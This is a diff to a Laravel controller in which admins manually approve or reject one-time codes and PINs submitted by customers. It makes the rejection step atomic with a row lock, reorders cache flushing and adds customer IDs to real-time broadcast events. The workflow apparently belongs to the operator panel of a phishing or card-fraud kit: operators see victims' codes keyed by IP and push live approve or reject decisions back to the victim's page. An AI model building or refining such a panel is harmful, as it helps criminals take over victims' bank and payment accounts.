@@ -72,18 +72,20 @@ class AdminOtpController extends Controller
             \Log::error("approveOtp: No customer IP for OTP #{$id}");
         }
 
+        $customerId = $otp->customer?->id;
+
+        // Flush cache BEFORE broadcast so other admins get fresh data immediately
+        $this->flushCustomerCache();
+
         try {
             if ($otp->type === 'otp') {
-                broadcast(new OtpApproved($customerIp, null, $sessionId))->toOthers();
+                broadcast(new OtpApproved($customerIp, null, $sessionId, $customerId))->toOthers();
             } elseif ($otp->type === 'pin') {
-                broadcast(new PinApproved($customerIp, null, $sessionId))->toOthers();
+                broadcast(new PinApproved($customerIp, null, $sessionId, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
             \Log::warning('Broadcast failed (approveOtp): ' . $e->getMessage());
         }
-
-        // Flush customer list cache so dashboard polls get fresh data
-        $this->flushCustomerCache();
 
         $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_approved' : 'otp_approved');
         $this->refreshPaymentViewed($customerIp);
@@ -103,44 +105,54 @@ class AdminOtpController extends Controller
             'reason' => 'nullable|string|max:500',
         ]);
 
-        $otp = OtpCode::findOrFail($id);
+        $reason = $request->input('reason');
 
-        if ($otp->status !== 'pending') {
-            return response()->json([
-                'success' => false,
-                'message' => 'هذا الرمز تم معالجته مسبقاً',
-            ], 422);
+        // Atomic check-then-update — same pattern as approve() to prevent race on otp_fail_count
+        [$otp, $earlyResponse] = \DB::transaction(function () use ($id, $reason) {
+            $otp = OtpCode::lockForUpdate()->findOrFail($id);
+
+            if ($otp->status !== 'pending') {
+                return [$otp, response()->json([
+                    'success' => false,
+                    'message' => 'هذا الرمز تم معالجته مسبقاً',
+                ], 422)];
+            }
+
+            $otp->reject($reason);
+
+            // Increment fail count + lockout after 10 consecutive failures
+            if ($otp->customer) {
+                $fails = $otp->customer->otp_fail_count + 1;
+                $lockUntil = $fails >= 10 ? now()->addMinutes(10) : null;
+                $otp->customer->update([
+                    'otp_fail_count'   => $fails,
+                    'otp_locked_until' => $lockUntil,
+                ]);
+            }
+
+            return [$otp, null];
+        });
+
+        if ($earlyResponse) {
+            return $earlyResponse;
         }
-
-        $reason     = $request->input('reason');
-
-        $otp->reject($reason);
 
         $customerIp = $otp->customer?->ip_address ?? '';
+        $customerId = $otp->customer?->id;
         $sessionId  = $otp->session_id;
 
-        // Increment fail count + lockout after 10 consecutive failures
-        if ($otp->customer) {
-            $fails = $otp->customer->otp_fail_count + 1;
-            $lockUntil = $fails >= 10 ? now()->addMinutes(10) : null;
-            $otp->customer->update([
-                'otp_fail_count'   => $fails,
-                'otp_locked_until' => $lockUntil,
-            ]);
-        }
+        // Flush cache BEFORE broadcast so other admins get fresh data immediately
+        $this->flushCustomerCache();
 
         try {
             if ($otp->type === 'otp') {
-                broadcast(new OtpRejected($customerIp, $reason, $sessionId))->toOthers();
+                broadcast(new OtpRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
             } elseif ($otp->type === 'pin') {
-                broadcast(new PinRejected($customerIp, $reason, $sessionId))->toOthers();
+                broadcast(new PinRejected($customerIp, $reason, $sessionId, $customerId))->toOthers();
             }
         } catch (\Throwable $e) {
             \Log::warning('Broadcast failed (rejectOtp): ' . $e->getMessage());
         }
-
-        // Flush customer list cache so dashboard polls get fresh data
-        $this->flushCustomerCache();
 
         $this->notifyDashboard($customerIp, $otp->type === 'pin' ? 'pin_rejected' : 'otp_rejected');
         $this->refreshPaymentViewed($customerIp);
